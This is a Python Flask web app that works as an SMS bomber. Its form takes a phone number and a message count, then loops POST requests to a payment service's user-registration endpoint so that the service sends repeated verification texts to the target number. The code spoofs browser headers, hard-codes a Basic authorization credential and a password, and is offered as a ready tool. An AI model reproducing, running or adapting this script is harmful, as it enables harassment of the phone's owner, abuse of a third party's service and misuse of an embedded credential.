from flask import Flask, render_template, request
import requests

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone_number = request.form['phone_number']
        sms_count = int(request.form['sms_count'])  # Convert sms_count to an integer

        url = 'https://capi.upay.uz/rest/ar/prepare_register_user'
        headers = {
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-platform': '"Android"',
            'accept-language': 'ru',
            'sec-ch-ua-mobile': '?1',
            'authorization': 'Basic Y2FiaW5ldDpDZGU3NTYjQCFQbE0=',
            'user-agent': 'Tor Browser/1.0 (Linux; ubuntu 22.04 TLS; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.',
            'content-type': 'application/json; charset=UTF-8',
            'accept': 'application/json',
            'version': '1.5.5m',
            'origin': 'https://my.upay.uz',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://my.upay.uz/',
            'accept-encoding': 'gzip, deflate, br, zstd',
        }

        data = {
            "phone": phone_number,
            "password": "@cyberknightuz",
            "retryPassword": "@cyberknightuz"
        }

        response_messages = []
        for _ in range(sms_count):
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                result = response.json()
                response_messages.append(result)
            else:
                response_messages.append(f"Error: {response.status_code}")

        return render_template('index.html', result=response_messages)

    return render_template('index.html', result=None)  # Pass result=None for initial render


if __name__ == '__main__':
    app.run(debug=True)

# HTML template code
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send SMS</title>
</head>
<body>
    <h1>Send SMS</h1>
    <form action="/" method="post">
        <label for="phone_number">Phone Number:</label><br>
        <input type="text" id="phone_number" name="phone_number" required><br>
        <label for="sms_count">SMS Count:</label><br>
        <input type="number" id="sms_count" name="sms_count" min="1" required><br><br>
        <input type="submit" value="Send SMS">
    </form>

    {% if result %}
        <h2>Response Messages:</h2>
        <ul>
            {% for message in result %}
                <li>{{ message }}</li>
            {% endfor %}
        </ul>
    {% endif %}
</body>
</html>
'''


@app.route('/index.html')
def render_html():
    return html_template

